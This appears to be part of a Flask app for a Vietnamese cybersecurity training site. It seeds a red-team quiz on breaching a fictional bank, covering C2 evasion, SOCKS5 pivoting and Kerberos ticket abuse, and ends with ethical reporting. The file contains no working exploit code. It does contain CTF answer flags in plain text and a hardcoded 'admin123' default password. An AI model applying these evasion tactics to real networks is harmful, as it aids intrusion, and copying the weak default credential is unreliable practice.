                        "feedback": "Xuất sắc! Lưu lượng C2 hoàn toàn hòa lẫn vào lưu lượng HTTPS doanh nghiệp bình thường, vượt qua cơ chế kiểm tra SSL Inspection và không bị phát hiện."
                    },
                    {
                        "id": "C",
                        "title": "Cài Đặt Phần Mềm TeamViewer / AnyDesk",
                        "desc": "Tải phần mềm thương mại TeamViewer để mở màn hình điều khiển trực tiếp.",
                        "is_correct": False,
                        "feedback": "Bị phần mềm Application Control chặn! Các công cụ Remote Desktop trái phép bị khóa cứng bởi chính sách AppLocker/WDAC của doanh nghiệp."
                    }
                ]
            },
            {
                "order": 6,
                "name": "Privilege Escalation & Lateral Movement (Leo quyền & Dịch chuyển ngang)",
                "icon": "fa-solid fa-route",
                "objective": "Vượt qua phân vùng mạng DMZ tiếp cận mạng nội bộ Active Directory mà không gây chú ý.",
                "situation": "Máy chủ Web bạn đang kiểm soát nằm ở vùng DMZ. Mục tiêu cốt lõi (Crown Jewels) là máy chủ Cơ sở dữ liệu giao dịch tài chính nằm sâu trong mạng nội bộ (Internal Core Banking VLAN) quản trị qua Active Directory.",
                "options": [
                    {
                        "id": "A",
                        "title": "Kết Nối Trực Tiếp RDP Về Domain Controller",
                        "desc": "Mở kết nối RDP port 3389 từ máy Web DMZ vào thẳng Domain Controller và thử brute-force tài khoản Administrator.",
                        "is_correct": False,
                        "feedback": "Thất bại! Tường lửa nội bộ chặn hoàn toàn RDP từ DMZ vào Core VLAN, và hành vi brute-force gây khóa tài khoản Domain Admin kích hoạt báo động đỏ toàn công ty."
                    },
                    {
                        "id": "B",
                        "title": "SOCKS5 Reverse Pivot & Khai Thác Vé Kerberos",
                        "desc": "Dựng kênh SOCKS5 Reverse Proxy (Chisel/Ligolo) qua máy DMZ làm bàn đạp pivot. Khai thác vé Kerberos (Pass-the-Ticket / Overpass-the-Hash) hoặc lạm dụng quyền ACLs trên AD.",
                        "is_correct": True,
                        "feedback": "Chuẩn xác! Thiết lập SOCKS5 Proxy biến máy DMZ thành bàn đạp (pivot), cho phép định tuyến công cụ pentest nội bộ từ máy attacker mà không làm thay đổi cấu hình mạng, sau đó lạm dụng vé Kerberos hợp lệ để dịch chuyển ngang mà không cần ném mã độc thô thiển."
                    },
                    {
                        "id": "C",
                        "title": "Quét Lỗ Hổng EternalBlue MS17-010 Diện Rộng",
                        "desc": "Dùng exploit EternalBlue quét hàng loạt các dải IP nội bộ của ngân hàng.",
                        "is_correct": False,
                        "feedback": "Bị IDS mạng phát hiện! Các chữ ký EternalBlue rất cũ và phổ biến, Network IDS lập tức cảnh báo và cô lập ngay máy chủ DMZ."
                    }
                ]
            },
            {
                "order": 7,
                "name": "Actions on Objectives (Đạt mục tiêu chiến dịch có kiểm soát)",
                "icon": "fa-solid fa-trophy",
                "objective": "Chứng minh tác động an ninh cho khách hàng theo đúng chuẩn đạo đức và nguyên tắc RoE của Red Team.",
                "situation": "Bạn đã tiếp cận được máy chủ Database chứa dữ liệu thẻ tín dụng và giao dịch tài chính của FinSecure. Với tư cách là Red Team (hoạt động có trách nhiệm và tuân thủ RoE), hành động đúng đắn cuối cùng là gì?",
                "options": [
                    {
                        "id": "A",
                        "title": "Exfiltrate Toàn Bộ Dữ Liệu Lên Diễn Đàn Dark Web",
                        "desc": "Tải 10 TB cơ sở dữ liệu thật về máy cá nhân và đưa công khai lên diễn đàn chợ đen.",
                        "is_correct": False,
                        "feedback": "Vi phạm pháp luật hình sự nghiêm trọng! Red Team chỉ đánh giá và chứng minh tác động; tuyệt đối không đánh cắp hoặc làm rò rỉ dữ liệu khách hàng thật."
                    },
                    {
                        "id": "B",
                        "title": "Trích Xuất Bằng Chứng Demo Đã Che (Masked) & Tổ Chức Purple Team",
                        "desc": "Trích xuất 1-2 dòng dữ liệu demo đã được che thông tin (masking), chụp ảnh màn hình bằng chứng PoC, ghi chép chi tiết mốc thời gian (timeline), chuẩn bị báo cáo kỹ thuật và sẵn sàng buổi họp Purple Team để hỗ trợ Blue Team vá lỗi.",
                        "is_correct": True,
                        "feedback": "Hoàn hảo! Đây là chuẩn mực chuyên nghiệp cao nhất của Red Team: chứng minh được tác động rủi ro, bảo vệ an toàn toàn vẹn dữ liệu doanh nghiệp và hỗ trợ Đội Xanh nâng cao năng lực phòng thủ."
                    },
                    {
                        "id": "C",
                        "title": "Mã Hóa Dữ Liệu Tống Tiền Đòi Tiền Chuộc Bitcoin",
                        "desc": "Chạy mã độc mã hóa toàn bộ dữ liệu ngân hàng và để lại ghi chú đòi tiền chuộc.",
                        "is_correct": False,
                        "feedback": "Tác hại nghiêm trọng! Gây gián đoạn hoạt động kinh doanh (Downtime) trái với cam kết hợp đồng kiểm thử an ninh."
                    }
                ]
            }
        ]

        for s in steps_data:
            step_record = ScenarioStep(
                scenario_id=sc.id,
                order=s['order'],
                situation_text=json.dumps({
                    'name': s['name'],
                    'icon': s['icon'],
                    'objective': s['objective'],
                    'situation': s['situation']
                }, ensure_ascii=False),
                options=json.dumps(s['options'], ensure_ascii=False)
            )
            db.session.add(step_record)
        db.session.commit()
        print('>>> Seeded RedTeam Scenario steps successfully.')


@app.route('/redteam_scenario')
@login_required
def redteam_scenario():
    seed_redteam_scenario()
    sc = Scenario.query.get(1)
    steps = ScenarioStep.query.filter_by(scenario_id=1).order_by(ScenarioStep.order).all()
    
    has_completed = AuditLog.query.filter_by(
        user_id=current_user.id,
        action='Completed Red Team Scenario: Enterprise Breach Simulation'
    ).first() is not None

    cur_step_order = session.get('scenario_step', 1)
    if cur_step_order > 7:
        cur_step_order = 7

    parsed_steps = []
    for s in steps:
        sit = json.loads(s.situation_text)
        opts = json.loads(s.options)
        parsed_steps.append({
            'id': s.id,
            'order': s.order,
            'name': sit.get('name'),
            'icon': sit.get('icon'),
            'objective': sit.get('objective'),
            'situation': sit.get('situation'),
            'options': opts
        })

    return render_template('redteam_scenario.html',
                           scenario=sc,
                           steps=parsed_steps,
                           current_step_order=cur_step_order,
                           has_completed=has_completed)


@app.route('/redteam_scenario/choose', methods=['POST'])
@login_required
def choose_scenario_option():
    seed_redteam_scenario()
    data = request.get_json(silent=True) or request.form
    try:
        step_order = int(data.get('step', 1))
    except (TypeError, ValueError):
        step_order = 1
    option_id = str(data.get('option_id', '')).upper()

    step_obj = ScenarioStep.query.filter_by(scenario_id=1, order=step_order).first()
    if not step_obj:
        return jsonify({'status': 'error', 'message': 'Không tìm thấy bước kịch bản này.'}), 404

    opts = json.loads(step_obj.options)
    chosen = next((o for o in opts if o['id'] == option_id), None)
    if not chosen:
        return jsonify({'status': 'error', 'message': 'Lựa chọn không hợp lệ.'}), 400

    if chosen['is_correct']:
        next_step = step_order + 1
        session['scenario_step'] = next_step
        
        completed = (step_order >= 7)
        points_awarded = 0
        if completed:
            already_completed = AuditLog.query.filter_by(
                user_id=current_user.id,
                action='Completed Red Team Scenario: Enterprise Breach Simulation'
            ).first() is not None
            if not already_completed:
                points_awarded = 50
                current_user.score += 50
                log_action('Completed Red Team Scenario: Enterprise Breach Simulation')
                db.session.commit()

        return jsonify({
            'status': 'success',
            'correct': True,
            'feedback': chosen['feedback'],
            'next_step': next_step,
            'completed': completed,
            'points_awarded': points_awarded,
            'new_score': current_user.score
        })
    else:
        return jsonify({
            'status': 'success',
            'correct': False,
            'feedback': chosen['feedback']
        })


@app.route('/redteam_scenario/reset', methods=['POST'])
@login_required
def reset_scenario():
    session['scenario_step'] = 1
    return jsonify({'status': 'success', 'message': 'Đã đặt lại kịch bản về bước 1.'})


if __name__ == '__main__':
    with app.app_context():
        db.create_all()
        seed_knowledge_base()
        seed_redteam_scenario()
        # Xóa bảng cũ nếu schema thay đổi
        db.session.commit()
        
        if not User.query.filter_by(username='admin').first():
            admin_password = os.environ.get('ADMIN_PASSWORD', 'admin123')
            admin_email = os.environ.get('ADMIN_EMAIL', 'admin@gmail.com')
            admin_user = User(
                email=admin_email,
                username='admin',
                password=generate_password_hash(admin_password, method='pbkdf2:sha256'),
                role='admin'
            )
            db.session.add(admin_user)
            db.session.commit()
            print(f">>> Admin account created (email: {admin_email})")

        if Challenge.query.count() == 0:
            db.session.add_all([
                Challenge(title="SQL Injection Basic", description="Tìm Flag ẩn trong module Red Team SQL Lab.", flag="FLAG{SQL_WIN}", points=100, category="Web"),
                Challenge(title="Hidden in Plain Sight", description="Tìm Flag ẩn (Inspect Element).", flag="FLAG{HTML_MASTER}", points=50, category="Misc"),
                Challenge(title="Stego 101", description="Giấu trong ảnh.", flag="FLAG{PIXELS_DONT_LIE}", points=200, category="Forensics")
            ])
            db.session.commit() 
            print(">>> CTF Challenges created.")

        print(">>> Database Initialized successfully.")
        
    is_debug = os.environ.get('FLASK_DEBUG', 'false').lower() == 'true'

    # Khởi động background thread ping target
    ping_thread = threading.Thread(target=_ping_target_loop, daemon=True)
    ping_thread.start()
    print(">>> Target Ping Monitor started (interval: 10s)")

    # Chạy bằng SocketIO (thay vì app.run) để hỗ trợ WebSockets cùng với Flask
    socketio.run(app, host='0.0.0.0', port=5000, debug=is_debug, use_reloader=False)
